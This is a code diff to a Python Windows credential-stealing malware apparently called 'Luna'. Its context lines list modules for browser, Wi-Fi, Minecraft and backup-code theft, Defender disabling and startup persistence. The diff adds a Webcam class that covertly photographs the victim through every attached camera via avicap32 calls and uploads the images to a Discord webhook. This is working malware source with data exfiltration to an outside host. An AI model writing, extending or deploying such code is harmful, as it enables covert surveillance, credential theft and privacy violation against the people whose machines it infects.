@@ -13,6 +13,7 @@ import time
 from multiprocessing import cpu_count
 from shutil import copy2
 from zipfile import ZIP_DEFLATED, ZipFile
+from ctypes import wintypes
 
 import psutil
 import requests
@@ -51,7 +52,7 @@ localappdata = os.getenv("localappdata")
 
 
 def main(webhook: str):
-    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
+    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender, Webcam]
     configcheck(threads)
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
@@ -790,6 +791,71 @@ class BackupCodes:
                             f.write(line)
             f.close()
 
+class Webcam:
+    """Author: Blank-c, for Luna"""
+    def __init__(self):
+        index = 0
+        files_to_send = []
+        while True:
+            path = os.path.join(os.getenv("temp"), "Webcam", "Webcam %d.bmp" % (index + 1))
+            os.makedirs(os.path.dirname(path), exist_ok=True)
+            if self.CaptureWebcamSysCall(index, path):
+                files_to_send.append(path)
+                index += 1
+            else:
+                break
+        if files_to_send:
+            for filepath in files_to_send:
+                self.send_file(filepath)
+
+    def CaptureWebcamSysCall(self, index: int, filePath: str) -> bool:
+        avicap32 = ctypes.windll.avicap32
+        WS_CHILD = 0x40000000
+        WM_CAP_DRIVER_CONNECT = 0x0400 + 10
+        WM_CAP_DRIVER_DISCONNECT = 0x0402
+        WM_CAP_FILE_SAVEDIB = 0x0400 + 100 + 25
+
+        hcam = avicap32.capCreateCaptureWindowW(
+            wintypes.LPWSTR("Blank"),
+            WS_CHILD,
+            0, 0, 0, 0,
+            ctypes.windll.user32.GetDesktopWindow(), 0
+        )
+
+        result = False
+
+        if hcam:
+            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
+                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
+                    result = True
+                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
+            ctypes.windll.user32.DestroyWindow(hcam)
+        
+        return result
+    
+    def send_file(self, path):
+        webhook = __CONFIG__.get("webhook")
+
+        with open(path, "rb") as f:
+            file = f.read()
+
+        webhook_data = {
+            "username": "Luna",
+            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+            "embeds": [
+                {
+                    "color": 5639644,
+                    "title": "Webcam Screenshot",
+                    "image": {
+                        "url": "attachment://image.png"
+                    }
+                }
+            ],
+        }
+
+        encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', file, 'image/bmp')})
+
+        requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
 
 class AntiSpam:
     def __init__(self):
